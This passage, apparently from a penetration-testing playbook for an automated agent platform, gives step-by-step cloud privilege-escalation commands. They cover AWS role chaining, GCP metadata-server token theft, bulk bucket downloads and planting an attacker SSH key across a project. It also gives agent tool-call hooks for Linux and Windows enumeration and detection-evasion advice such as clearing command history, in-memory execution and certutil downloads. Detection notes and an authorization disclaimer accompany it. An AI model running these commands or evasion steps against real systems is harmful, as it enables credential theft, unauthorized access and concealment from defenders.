aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Condition.BoolIfExists.'aws:MultiFactorAuthPresent', 'true')].RoleName" 2>/dev/null

# Or enumerate all roles and check which allow assumption:
aws iam list-roles --query "Roles[].RoleArn" --output text | tr '\t' '\n' | while read arn; do
  aws sts assume-role --role-arn "$arn" --role-session-name test 2>/dev/null && echo "CAN ASSUME: $arn"
done
```

Step 5 — Assume target role (MFA condition satisfied by session token):
```bash
aws sts assume-role \
  --role-arn "arn:aws:iam::<ACCOUNT_ID>:role/<TARGET_ROLE>" \
  --role-session-name pentest-$(date +%s) \
  --output json
```

Step 6 — Role chaining — assume additional roles with elevated privileges:
```bash
# Export new credentials from first assumed role:
export AWS_ACCESS_KEY_ID="<ROLE_A_ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<ROLE_A_SECRET>"
export AWS_SESSION_TOKEN="<ROLE_A_SESSION_TOKEN>"

# Assume higher-privilege Role B:
aws sts assume-role \
  --role-arn "arn:aws:iam::<ACCOUNT_ID>:role/<HIGH_PRIV_ROLE>" \
  --role-session-name chain-$(date +%s)
```

Step 7 — Validate escalated access:
```bash
# With Role B credentials:
export AWS_ACCESS_KEY_ID="<ROLE_B_ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<ROLE_B_SECRET>"
export AWS_SESSION_TOKEN="<ROLE_B_SESSION_TOKEN>"

# Test admin access:
aws iam list-users
aws ec2 describe-instances --region us-east-1
aws s3 ls
```

**Detection:**
- CloudTrail: Multiple consecutive `sts:AssumeRole` calls in short succession
- CloudTrail: Role assumption from unusual source identity
- Guard Duty: IAM role chaining anomaly detection
- Alert: `sts:GetSessionToken` followed by role assumption within minutes

**MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism), T1078.004 (Valid Accounts: Cloud Accounts)

---

### Section 5.3 — GCP Service Account Abuse

**Objective:** Escalate GCP privileges by abusing the metadata server to retrieve service account tokens, or by exploiting default service account configurations.

**Prerequisites:**
- Shell access inside a GCP VM instance, OR
- Compromised GCP service account key file
- Target GCP project has a default Compute Engine service account (default configuration)

**Procedure:**

Step 1 — Query GCP metadata server (from inside VM):
```bash
# Verify you're on GCP:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/id"

# List available service accounts:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Get access token for default service account:
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo $TOKEN
```

Step 2 — Identify service account permissions:
```bash
# Get current project:
PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id")

# Get service account email:
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")

# Query IAM policy for this SA:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:getIamPolicy" \
  | python3 -m json.tool | grep -A 5 "$SA_EMAIL"
```

Step 3 — Abuse default service account (Editor/Owner on project):
```bash
# GCP Compute Engine default SA often has Editor role — enumerate all VMs:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/$PROJECT/aggregated/instances" \
  | python3 -m json.tool

# List all storage buckets:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT" \
  | python3 -m json.tool

# Download sensitive files from buckets:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<BUCKET_NAME>/o" | python3 -m json.tool

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/download/storage/v1/b/<BUCKET_NAME>/o/<FILE_NAME>?alt=media" \
  > /tmp/downloaded_file
```

Step 4 — Lateral movement via GCP instance SSH:
```bash
# If SA has compute.instances.setMetadata permission, add SSH key to project metadata:
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://compute.googleapis.com/compute/v1/projects/$PROJECT/setCommonInstanceMetadata" \
  -d '{
    "fingerprint": "<METADATA_FINGERPRINT>",
    "items": [{
      "key": "ssh-keys",
      "value": "attacker:ssh-rsa <ATTACKER_PUBLIC_KEY> attacker@kali"
    }]
  }'

# Then SSH to any instance in the project:
ssh -i /path/to/attacker_private_key attacker@<INSTANCE_EXTERNAL_IP>
```

Step 5 — If service account key file is found on disk (common misconfiguration):
```bash
# Activate service account:
gcloud auth activate-service-account --key-file=/path/to/service-account-key.json

# Set project context:
gcloud config set project <PROJECT_ID>

# Enumerate permissions:
gcloud projects get-iam-policy <PROJECT_ID>
gcloud compute instances list
gcloud storage ls
```

**Detection:**
- GCP Audit Logs: Unusual metadata server queries
- GCP Audit Logs: Role binding changes (setIamPolicy)
- Alert: Service account used from unexpected source IP
- GCP Security Command Center: Anomalous service account activity
- Alert: `compute.instances.setMetadata` operation adding SSH keys

**MITRE ATT&CK:** T1078.004 (Valid Accounts: Cloud Accounts), T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

---

## ATHENA Agent Integration Notes

### Automation Hooks for ATHENA Agents

```python
# ATHENA tool call patterns for LOTL techniques:

# Linux PrivEsc Agent — post-shell enumeration:
# 1. enumerate_suid_binaries() -> find / -perm -4000 -type f 2>/dev/null
# 2. enumerate_sudo_rules() -> sudo -l
# 3. enumerate_capabilities() -> getcap -r / 2>/dev/null
# 4. enumerate_cron_jobs() -> cat /etc/crontab; ls /etc/cron.d/
# 5. fingerprint_kernel() -> uname -a; cat /proc/version
# 6. check_docker() -> ls /.dockerenv; cat /proc/1/cgroup | grep docker
# Cross-reference: GTFOBins JSON API for each binary found

# Windows PrivEsc Agent — post-shell enumeration:
# 1. check_applocker_policy() -> Get-AppLockerPolicy -Effective
# 2. check_uac_settings() -> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
# 3. check_installed_binaries() -> dir C:\Windows\System32\*.exe
# 4. enumerate_credentials() -> cmdkey /list; reg query HKCU /f password /t REG_SZ /s
# Cross-reference: LOLBAS YAML database for each present binary

# Cloud Recon Agent:
# 1. detect_cloud_provider() -> curl -s metadata endpoint
# 2. query_imds_token() -> platform-specific IMDS call
# 3. enumerate_iam_permissions() -> platform-specific IAM query
# 4. escalation_path_analysis() -> check for roleAssignments/write, iam:PassRole, etc.
```

### Detection Evasion Guidance for ATHENA

1. **Use LOTL techniques first** — native binaries generate less EDR noise than custom tools
2. **Avoid disk writes** where possible — use in-memory execution (PowerShell IEX, Python -c)
3. **Randomize timing** — don't run all enumeration commands in rapid succession
4. **Clean up artifacts** — remove downloaded files, clear command history after use
5. **Check HVCI before BYOVD** — avoid wasted time on blocked driver techniques
6. **Prefer certutil over custom downloaders** — trusted binary reduces network egress alerting

### Programmatic Data Sources

| Resource | API Endpoint | Format | Update Frequency |
|----------|-------------|--------|-----------------|
| GTFOBins | `https://gtfobins.github.io/index.json` | JSON | Community-driven |
| LOLDrivers | `https://loldrivers.io/api/drivers.json` | JSON | Community-driven |
| LOLBAS | `https://github.com/LOLBAS-Project/LOLBAS/tree/master/yml` | YAML | Community-driven |
| LOLApps | `https://github.com/LOLAPPS-Project/LOLAPPS/tree/main/yml` | YAML | Growing |

---

## Technique Quick Reference

### Linux Escalation — Time-to-Root Estimate

| Technique | Complexity | Detection Risk | Time to Root |
|-----------|-----------|----------------|-------------|
| SUID python/bash | Low | Medium | < 1 min |
| Sudo any GTFOBins binary | Low | Medium | < 1 min |
| cap_setuid on python | Low | Low | < 1 min |
| Writable cron script | Low | Low | 1-5 min |
| PwnKit (CVE-2021-4034) | Medium | High (known sig) | 2-5 min |
| Docker socket escape | Low | Medium | 2-5 min |
| Kernel exploit | High | High | 10-30 min |

### Windows Escalation — Time-to-Admin Estimate

| Technique | Complexity | Detection Risk | Time to Escalation |
|-----------|-----------|----------------|-------------------|
| fodhelper UAC bypass | Low | Medium | < 1 min |
| MSBuild AppLocker bypass | Medium | Medium | 2-5 min |
| NTDS via diskshadow | Medium | High | 5-15 min |
| BYOVD EDR kill | High | Critical | 10-30 min |
| Regsvr32 Squiblydoo | Low | Medium | < 1 min |

### Cloud Escalation — Complexity Reference

| Technique | Prerequisites | Impact |
|-----------|--------------|--------|
| IMDS token theft | Inside VM | VM's managed identity scope |
| Azure runCommand | `virtualMachines/runCommand` perm | Inherit VM managed identity |
| AWS role chaining | IAM user creds + MFA | Role chain endpoint permissions |
| GCP default SA abuse | Inside GCE VM | Editor on project (often) |

---

## References

- GTFOBins: https://gtfobins.github.io/
- LOLBAS Project: https://lolbas-project.github.io/
- LOLApps: https://lolapps-project.github.io/
- LOLDrivers: https://loldrivers.io/
- HackTricks AD Methodology: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- LOLOL Farm (meta-aggregator): https://lolol.farm/
- Praetorian Azure RBAC PrivEsc: https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/
- Praetorian AWS IAM Chaining: https://www.praetorian.com/blog/stsgetsessiontoken-role-chaining-in-aws/
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/
- EDRSandBlast: https://github.com/wavestone-cdt/EDRSandBlast

---

*Playbook version 1.0.0 | Generated 2026-02-26 | ATHENA Pentest Platform | ZeroK Labs*
*For authorized penetration testing use only. All techniques require written client authorization.*
